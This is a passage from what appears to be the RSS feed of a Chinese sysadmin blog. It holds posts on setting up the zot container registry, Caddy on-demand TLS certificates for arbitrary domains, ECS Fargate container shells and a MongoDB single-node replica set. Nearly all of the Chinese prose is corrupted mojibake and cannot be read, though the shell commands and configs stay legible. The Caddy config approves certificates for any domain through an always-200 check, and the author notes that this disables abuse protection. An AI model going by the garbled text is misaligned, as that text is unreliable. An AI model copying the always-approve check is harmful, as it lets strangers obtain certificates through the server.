&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¯¦ç»†è§£é‡Šä¸€ä¸‹ï¼ŒenX0æ˜¯privateå­ç½‘çš„ç½‘å¡ï¼ŒenX1æ˜¯å¼¹æ€§IPçš„ç½‘å¡ï¼Œæ³¨æ„ï¼Œå³ä½¿æ˜¯å¼¹æ€§IPï¼Œä¹Ÿæ˜¯ä¸ªå†…ç½‘åœ°å€ï¼Œè¿™ä¸¤ä¸ªIPå‘¢ï¼Œéƒ½æœ‰å„è‡ªç‹¬ç«‹çš„ç½‘å…³ï¼Œç¬¬äºŒä¸ªç½‘å¡è¿˜æœ‰è‡ªå·±çš„DNSã€‚è¿™å°±å®¹æ˜“å‘ç”Ÿé”™ä¹±äº†ï¼Œå› ä¸ºç¼ºçœè·¯ç”±èµ°ç¬¬ä¸€ä¸ªç½‘å¡ï¼Œé‚£å¦‚æœä»ç¬¬äºŒä¸ªç½‘å¡çš„å…¬ç½‘IPå…¥ï¼Œå‡ºçš„æ—¶å€™èµ°ç¬¬ä¸€å¼ ç½‘å¡ï¼Œé‚£å°±æœ‰æ„æ€äº†ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>å®‰è£…è½»é‡çº§çš„Docker registryï¼šzot</title>
      <link>https://rendoumi.com/posts/20251111-zot_registry/</link>
      <pubDate>Tue, 11 Nov 2025 09:01:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20251111-zot_registry/</guid>
      <description>&lt;p&gt;æœåŠ¡å™¨åœ¨HKï¼Œä½†æ˜¯å»æ‹‰å–è…¾è®¯å¹¿å·Dockeré•œåƒä»“çš„æ—¶å€™æ€»æ˜¯å¤±è´¥ï¼Œè¿˜æ˜¯ä¼ä¸šç‰ˆï¼Œå¤§æ— è¯­äº†ã€‚&lt;/p&gt;
&lt;p&gt;æ²¡åŠæ³•ï¼Œè¢«é€¼æ— å¥ˆï¼Œå¹²è„†åœ¨HKå»ºä¸€ä¸ªé•œåƒä»“ï¼Œç„¶åæ¨é€åˆ°é‚£é‡Œï¼Œè¿™æ ·å°±æ–¹ä¾¿äº†ã€‚&lt;/p&gt;
&lt;p&gt;åˆšå¼€å§‹çš„æƒ³æ³•æ˜¯ç”¨Harborï¼Œä½†æ˜¯Harborå®åœ¨å¤ªæ²‰é‡äº†ï¼Œè€Œä¸”Harborçš„æœ€å¤§é—®é¢˜æ˜¯è¿‡æœŸé•œåƒæ¸…ç†ï¼Œå¦‚æœè¿‡æœŸé•œåƒå‡ºé”™äº†ï¼Œé‚£æ˜¯æ¸…ç†ä¸æ‰çš„ï¼Œé™¤éé‡æ–°æ‰“åŒ…ä¸Šä¼ è¦†ç›–æ‰é”™è¯¯çš„é•œåƒï¼Œç„¶åå†åˆ é™¤æ‰å¯ä»¥ï¼Œä½†é—®é¢˜æ˜¯å¦‚æœæœ‰700ã€800ä¸ªé”™çš„é•œåƒï¼Œé‚£æ˜¯çœŸæ²¡æœ‰é‚£ä¸ªåŠ²å»æ¸…ç†äº†ã€‚&lt;/p&gt;
&lt;p&gt;é‚£è¿™æ¬¡å°±æƒ³å»ºä¸ªè½»é‡çº§çš„ï¼Œå¹²è„†è¿WEBç•Œé¢éƒ½ä¸è¦ï¼Œåªè¦docker loginåèƒ½pushå’Œpullå³å¯ï¼&lt;/p&gt;
&lt;p&gt;è¿™æ ·çš„è¯zotæ˜¯ä¸ªä¸é”™çš„é€‰æ‹©ï¼Œzotæ˜¯å…¼å®¹ociæ ‡å‡†çš„ï¼ŒæŸäº›åœ°æ–¹è·Ÿdockeræ˜¯ä¸å…¼å®¹çš„ï¼š&lt;/p&gt;
&lt;p&gt;ä¸‹è½½zot&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget https://github.com/project-zot/zot/releases/download/v2.1.10/zot-linux-amd64
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å‡†å¤‡é…ç½®æ–‡ä»¶&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat &amp;gt;/usr/local/bin/config.json &lt;span class=&#34;s&#34;&gt;&amp;lt;&amp;lt; EOF
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;  &amp;#34;distSpecVersion&amp;#34;: &amp;#34;1.0.0-dev&amp;#34;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;  &amp;#34;http&amp;#34;: {
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    &amp;#34;address&amp;#34;: &amp;#34;127.0.0.1&amp;#34;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    &amp;#34;port&amp;#34;: &amp;#34;5000&amp;#34;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    &amp;#34;compat&amp;#34;: [&amp;#34;docker2s2&amp;#34;],
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    &amp;#34;auth&amp;#34;: {
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;      &amp;#34;htpasswd&amp;#34;: {
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;        &amp;#34;path&amp;#34;: &amp;#34;/usr/local/bin/htpasswd&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;      }
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;  },
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;  &amp;#34;storage&amp;#34;: {
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    &amp;#34;rootDirectory&amp;#34;: &amp;#34;/data/registry&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;EOF&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ³¨æ„ä¸Šé¢compatï¼Œå¦‚æœä¸é…ç½®ï¼Œå°±ä¼šå‡ºç°pushçš„æ—¶å€™å‡ºç°&lt;code&gt;manifest invalid&lt;/code&gt;é”™è¯¯ï¼Œè¿™æ˜¯å› ä¸ºdockerå’Œociçš„æ ‡å‡†ä¸åŒï¼Œzotæ˜¯éµå¾ªociæ ‡å‡†çš„&lt;/p&gt;
&lt;p&gt;å‡†å¤‡htpasswdï¼Œå¿…é¡»ç”¨bcryptçš„æ–¹å¼ï¼Œzotä¸æ”¯æŒå…¶å®ƒçš„ï¼&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-B  Force bcrypt hashing of the password &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;very secure&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;htpasswd -B -c /usr/local/bin/htpasswd user01
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å‡†å¤‡&lt;code&gt;zot.service&lt;/code&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Caddyè‡ªåŠ¨ç­¾å‘ä»»æ„åŸŸåè¯ä¹¦</title>
      <link>https://rendoumi.com/posts/20251110-caddy_wild_certificate/</link>
      <pubDate>Mon, 10 Nov 2025 09:02:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20251110-caddy_wild_certificate/</guid>
      <description>&lt;p&gt;å…¬å¸çš„SAASå¹³å°ï¼Œæœ¬æ¥å¤šç§Ÿæˆ·çš„è¯ä¹¦ç®¡ç†æ¨¡å¼é¢„è®¡æ˜¯è¿™æ ·çš„ï¼š&lt;/p&gt;
&lt;p&gt;ç»™æ¯ä¸ªç§Ÿæˆ·å•ç‹¬è®¾ç«‹ä¸€ä¸ª xyz.alibaba.com çš„å­åŸŸåï¼Œç„¶åç”¨cert-managerç®¡ç†è¯ä¹¦ï¼Œåªè¦annouceä¸€ä¸ª xyz.alibaba.com çš„ingresså‡ºæ¥ï¼Œå°±ä¼šè‡ªåŠ¨ç­¾å‘è¯ä¹¦ã€‚&lt;/p&gt;
&lt;p&gt;ç„¶è€Œç ”å‘è§‰å¾—è¿™æ ·ä¹Ÿæ˜¯å¾ˆä¸çˆ½ï¼Œè¿annouce ingressä¹Ÿä¸æ„¿æ„ï¼Œå°±æƒ³å®¢æˆ·çš„åŸŸåç›´æ¥è§£æä¸€ä¸ª xyz.å®¢æˆ·.com çš„ cname è¿‡æ¥ï¼Œç„¶åå°±è‡ªåŠ¨ç­¾å‘è¯ä¹¦ã€‚&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªéœ€æ±‚çœŸçš„æ˜¯å¾ˆæœ‰æ„æ€ï¼Œä¹Ÿåªæœ‰caddyèƒ½å¾ˆè½»æ¾çš„è¿™ä¹ˆå®ç°ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;ä¸€ã€åšå¥½ä¸€ä¸ªcaddyçš„deployå’Œserviceï¼Œå‰é¢ç›´æ¥é¡¶ä¸€ä¸ªLoadbalance&lt;/p&gt;
&lt;p&gt;äºŒã€é…ç½®caddyçš„é…ç½®&lt;/p&gt;
&lt;p&gt;/etc/caddy/Caddyfile çš„å†…å®¹&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    debug
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    on_demand_tls &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        ask http://localhost:5555/
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https:// &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    tls &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        on_demand
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    handle &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        reverse_proxy https://alibaba.com &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            header_up Host alibaba.com
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    respond &lt;span class=&#34;s2&#34;&gt;&amp;#34;Welcome to dynamic certificate signing!&amp;#34;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://localhost:5555 &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        respond &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ³¨æ„ä¸Šé¢ï¼ŒCaddyå¯¹è¿™ç§éšä¾¿çš„åŸŸåï¼Œæ˜¯è¦æ±‚å»é—®ä¸€ä¸‹åç«¯çš„æœåŠ¡æ˜¯å¦å¯¹è¿™ä¸ªåŸŸåè¿›è¡Œç­¾å‘çš„ï¼Œè¿™æ˜¯ä¸ºäº†é˜²æ­¢æ»¥ç”¨ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬ç›´æ¥åšä¸ªè™šæ‹ŸæœåŠ¡ï¼Œå›åº”200å³å¯&lt;/p&gt;
&lt;p&gt;è¿™æ ·çš„åšæ³•æ¯”è¾ƒç›´æ¥äº†å½“ï¼Œå½“ç„¶åªé€‚ç”¨äºå›½å¤–ï¼Œå›½å†…å°±éº»çƒ¦äº†ï¼ŒæœªçŸ¥çš„åŸŸåè§£æåˆ°ä½ çš„ipä¸Šï¼Œæ²¡å¤‡æ¡ˆç›´æ¥å°±ä¼šè¢«å°ç«™ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>AWSçš„ECSä½¿ç”¨FargateæœåŠ¡å™¨å¦‚ä½•å¼€å¯shellè¿›å…¥å®¹å™¨è°ƒè¯•</title>
      <link>https://rendoumi.com/posts/20251110-aws-ecs_fargate/</link>
      <pubDate>Mon, 10 Nov 2025 09:01:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20251110-aws-ecs_fargate/</guid>
      <description>&lt;p&gt;å…¬å¸ç”¨åˆ°äº†&lt;code&gt;Amazon Elastic Container Service&lt;/code&gt;ï¼Œå®Œå…¨æ‰˜ç®¡çš„å®¹å™¨æœåŠ¡&lt;/p&gt;
&lt;p&gt;æœåŠ¡å™¨ç”¨çš„æ˜¯Fargateï¼Œæ²¡æœ‰è‡ªå·±çš„æœåŠ¡å™¨ï¼Œçº¯æ‰˜ç®¡çš„ï¼Œå¼€å§‹éƒ¨ç½²çš„æ—¶å€™ï¼Œä¹Ÿæ²¡æœ‰è€ƒè™‘åˆ°æœ‰ä¸€å¤©è¦è¿›å…¥å®¹å™¨è¿›è¡Œè°ƒè¯•ã€‚&lt;/p&gt;
&lt;p&gt;ç°åœ¨éº»çƒ¦å°±æ¥äº†ï¼Œéœ€è¦è¿›å…¥å®¹å™¨ï¼ŒæŸ¥çœ‹æ–‡ä»¶æ—¥å¿—&lt;/p&gt;
&lt;p&gt;ç»“æœå°±å¾ˆéº»çƒ¦ï¼Œè§£å†³çš„æ­¥éª¤å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;h5 id=&#34;ä¸€æŸ¥çœ‹é›†ç¾¤çŠ¶æ€çœ‹çœ‹ä»»åŠ¡å®šä¹‰çš„ç‰ˆæœ¬å·ä¸‹é¢æ˜¯206&#34;&gt;ä¸€ã€æŸ¥çœ‹é›†ç¾¤çŠ¶æ€ï¼Œçœ‹çœ‹ä»»åŠ¡å®šä¹‰çš„ç‰ˆæœ¬å·ï¼Œä¸‹é¢æ˜¯206&lt;/h5&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251110091259097&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251110-aws-ecs_fargate/image-20251110091259097.png&#34;&gt;&lt;/p&gt;
&lt;h5 id=&#34;äºŒå»åˆ°ç›¸åº”çš„ä»»åŠ¡å®šä¹‰&#34;&gt;äºŒã€å»åˆ°ç›¸åº”çš„ä»»åŠ¡å®šä¹‰&lt;/h5&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251110091853031&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251110-aws-ecs_fargate/image-20251110091853031.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;æ³¨æ„ï¼Œç°åœ¨åªæœ‰ä¸€ä¸ªä»»åŠ¡æ‰§è¡Œè§’è‰²ï¼Œä»»åŠ¡è§’è‰²æ˜¯ä¸ªç©ºçš„ï¼ï¼ï¼&lt;/p&gt;
&lt;p&gt;ç„¶åæˆ‘ä»¬ç‚¹å¼€ä»»åŠ¡æ‰§è¡Œè§’è‰²ï¼Œæ·»åŠ æƒé™&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251110092123633&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251110-aws-ecs_fargate/image-20251110092123633.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;åˆå§‹åŒ–çš„æ—¶å€™åªæœ‰&lt;code&gt;AmazonECSTaskExecutionRolePolicy&lt;/code&gt;, æˆ‘ä»¬éœ€è¦åŠ ä¸Š&lt;code&gt;AmazonSSMManagedInstanceCore&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;åŠ å®Œå°±ä¸Šé¢ä¸€æ ·ã€‚&lt;/p&gt;
&lt;h5 id=&#34;ä¸‰è¿”å›åˆ°ä»»åŠ¡å®šä¹‰ä½¿ç”¨jsonåˆ›å»ºæ–°ä¿®è®¢&#34;&gt;ä¸‰ã€è¿”å›åˆ°ä»»åŠ¡å®šä¹‰ï¼Œä½¿ç”¨JSONåˆ›å»ºæ–°ä¿®è®¢&lt;/h5&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251110092432190&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251110-aws-ecs_fargate/image-20251110092432190.png&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;taskRoleArn&amp;#34;&lt;/span&gt;:      &lt;span class=&#34;s2&#34;&gt;&amp;#34;arn:xxxx:ecsTaskExecutionRole&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;executionRoleArn&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;arn:ecsTaskExecutionRole&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ–°å¢taskRoleArnï¼Œå’ŒexecutionRoleArnä¿æŒä¸€è‡´ï¼Œç„¶åä¿å­˜&lt;/p&gt;
&lt;h5 id=&#34;å››æŒ‰ç…§æ–°ç‰ˆæœ¬éƒ¨ç½²æ–°ä»»åŠ¡&#34;&gt;å››ã€æŒ‰ç…§æ–°ç‰ˆæœ¬ï¼Œéƒ¨ç½²æ–°ä»»åŠ¡&lt;/h5&gt;
&lt;p&gt;ä»æ–°ä»»åŠ¡å®šä¹‰æ›´æ–°æœåŠ¡&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251110100003930&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251110-aws-ecs_fargate/image-20251110100003930.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;é€‰æ‹©ç›¸åº”é›†ç¾¤ï¼Œç›¸åº”æœåŠ¡&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251110100041558&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251110-aws-ecs_fargate/image-20251110100041558.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;æ•…éšœæ’é™¤é…ç½®ï¼ŒåŠ¡å¿…å¼€å¯ECS execï¼Œç„¶åæ›´æ–°å³å¯&lt;img alt=&#34;image-20251110100113356&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251110-aws-ecs_fargate/image-20251110100113356.png&#34;&gt;&lt;/p&gt;
&lt;h5 id=&#34;äº”å¼€å¯å®¹å™¨çš„shell&#34;&gt;äº”ã€å¼€å¯å®¹å™¨çš„shell&lt;/h5&gt;
&lt;p&gt;æˆ‘å»é›†ç¾¤&amp;ndash;æœåŠ¡&amp;ndash;å®¹å™¨ï¼Œç‚¹å‡»è¿æ¥&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251110100318440&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251110-aws-ecs_fargate/image-20251110100318440.png&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;aws ecs execute-command --cluster yoov_work_e_form_prod_cluster --task 23xxxxx --container yontainer --interactive --command &lt;span class=&#34;s1&#34;&gt;&amp;#39;/bin/sh&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å®é™…å¯¹åº”çš„å‘½ä»¤å¦‚ä¸Šã€‚å…¶å®ä¹Ÿå¯ä»¥ç”¨awsçš„cliå®¢æˆ·ç«¯ç›´æ¥æ‰§è¡Œï¼Œåªä¸è¿‡è¦æ‹¿åˆ°é›†ç¾¤åå’Œå®¹å™¨åã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>MongoDBçš„ä¼ªå‰¯æœ¬æ¨¡å¼</title>
      <link>https://rendoumi.com/posts/20251029-mongodb-rs0/</link>
      <pubDate>Wed, 29 Oct 2025 09:01:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20251029-mongodb-rs0/</guid>
      <description>&lt;p&gt;è¿™ä¸ªè¯é¢˜æ¯”è¾ƒæœ‰æ„æ€ï¼Œå…¬å¸çš„æµ‹è¯•ç¯å¢ƒæœ¬æ¥æ˜¯ä¸€ä¸ªmongodbçš„ä¸‰èŠ‚ç‚¹ä¸‰å‰¯æœ¬å…¨é›†ç¾¤ï¼Œå‡çº§äº†2æ¬¡å‡åˆ°8.0ã€‚&lt;/p&gt;
&lt;p&gt;ç»“æœå§ï¼Œç”±äºé‡Œé¢æ•°æ®è¿‡äºåºå¤§ï¼Œæµ‹è¯•çš„æ—¶å€™ç»å¸¸æŠŠèŠ‚ç‚¹æ‰“æŒ‚ï¼Œè™½è¯´æ˜¯æ‰“æŒ‚ååˆèƒ½å¾ˆå¿«è¢«dockeræ‹‰èµ·æ¥ï¼Œä½†æ˜¯æŒ‚çš„é‚£ä¸ªæ—¶åˆ»åº”ç”¨ç¨‹åºå°±æ‰äº†ï¼Œå¯¼è‡´æµ‹è¯•å¤±è´¥ã€‚&lt;/p&gt;
&lt;p&gt;è¿™ä¸‰å°èŠ‚ç‚¹è¿˜éƒ½æ˜¯8 cpu 32G memoryçš„é…ç½®ï¼ŒçœŸå¤§æ— è¯­äº†ã€‚&lt;/p&gt;
&lt;p&gt;æ²¡åŠæ³•ï¼Œå¹²è„†å¼„æˆå•èŠ‚ç‚¹ï¼Œç„¶åå†…å­˜å’é«˜åˆ°128Gï¼ŒcpuåŠ åˆ°32ï¼Œå¼„å¥½ä¹‹åï¼Œè¯»å–æ•°æ®çš„&lt;code&gt;Flink&lt;/code&gt;åˆä¸è¡Œäº†ï¼Œè¦æ±‚æ˜¯å¿…é¡»è¯»mongoçš„å‰¯æœ¬ï¼ŒçœŸå®ŒçŠŠå­ã€‚&lt;/p&gt;
&lt;p&gt;é‚£å°±å¼ºåˆ¶å¯åŠ¨ä¸ªå‰¯æœ¬æ¨¡å¼å§ï¼š&lt;/p&gt;
&lt;p&gt;mongoå¯åŠ¨æ–¹å¼ç”¨çš„æ˜¯docker composeï¼Œå¯åŠ¨çš„æ—¶å€™æ–°å¢å‚æ•° &lt;code&gt;--replSet rs0&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# mongoæ•°æ®ç›®å½•çš„å±ä¸»æ˜¯ 999:999&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mkdir -p /data/mongodb/27017/data
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;chown -R 999:999 /data/mongodb/27017/data
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mkdir -p /data/mongodb/27017/conf/
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; /data/mongodb/27017
